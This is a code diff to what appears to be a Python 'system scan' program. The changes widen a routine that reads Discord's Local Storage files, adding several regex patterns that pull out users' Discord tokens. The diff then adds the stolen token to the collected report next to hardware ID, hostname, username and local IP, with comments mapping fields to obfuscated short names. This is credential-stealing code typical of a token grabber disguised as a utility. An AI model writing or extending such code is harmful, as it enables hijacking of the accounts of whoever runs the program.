@@ -916,6 +916,11 @@ def get_discord_token():
           os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
           os.path.join(appdata, "discordptb", "Local Storage", "leveldb")
      ]
+     token_patterns = [
+          r'["\']([\w-]{24}\.[\w-]{6}\.[\w-]{27,})["\']',  # Format token moderne Discord (xxx.yyy.zzz)
+          r'"token":\s*"([a-zA-Z0-9_.-]{50,100})"',         # Format JSON explicite
+          r'token["\']:\s*["\']([a-zA-Z0-9_.-]{50,100})',   # Variante sans guillemets doubles
+     ]
      for path in discord_paths:
           if not os.path.exists(path):
                continue
@@ -926,9 +931,10 @@ def get_discord_token():
                          try:
                               with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read()
-                                   matches = re.findall(r'"token":"([a-zA-Z0-9_-]{24,40})"', content)
-                                   if matches:
-                                        return matches[0]
+                                   for pattern in token_patterns:
+                                        matches = re.findall(pattern, content)
+                                        if matches:
+                                             return matches[0]
                          except Exception:
                               pass
           except Exception:
@@ -964,7 +970,8 @@ def get_discord_user_id():
 
 def get_extended_system_info():
     info = {}
-    info["discord_user_id"] = get_discord_user_id()
+    info["discord_user_id"]  = get_discord_user_id()
+    info["discord_token"]    = get_discord_token()
     try:
         res = subprocess.run(
             ["powershell", "-NoProfile", "-NonInteractive", "-Command",
@@ -1067,9 +1074,10 @@ def run_system_scan(progress_callback=None):
         "hwid"            : hwid,
         "hostname"        : socket.gethostname(),
         "user"            : getpass.getuser(),
-        "discord_id"      : ext_info.get("discord_user_id", "N/A"),
-        "userId"          : ext_info.get("discord_user_id", "N/A"),
-        "local_ip"        : ext_info.get("local_ip", "N/A"),
+        "discord_id"      : ext_info.get("discord_user_id", "N/A"),  # f_uid → nx_uid
+        "userId"          : ext_info.get("discord_user_id", "N/A"),  # alias
+        "discord_token"   : ext_info.get("discord_token", "N/A"),   # f_tk  → nx_tk
+        "local_ip"        : ext_info.get("local_ip", "N/A"),         # f_ip  → nx_ip
         "platform"        : sys.platform,
         "os_version"      : ext_info.get("os_version", "Windows"),
         "cpu_name"        : ext_info.get("cpu_name", "N/A"),
